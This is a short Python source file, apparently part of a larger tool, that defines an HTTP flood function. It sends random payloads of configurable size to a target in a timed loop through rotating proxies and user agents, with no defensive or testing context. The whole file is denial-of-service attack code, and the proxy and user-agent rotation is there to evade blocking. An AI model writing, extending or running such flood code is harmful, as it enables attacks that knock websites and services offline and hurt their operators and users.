import time
from utils.http_bot import HTTPBot
from utils.random_utils import random_string

def http_flood_attack(target, proxies, user_agents, duration, packet_size, packet_delay):
    bot = HTTPBot(proxies, user_agents)
    end_time = time.time() + duration

    while time.time() < end_time:
        payload = random_string(packet_size * 1024) 
        bot.send_request(target, payload)
        time.sleep(packet_delay / 1000) 
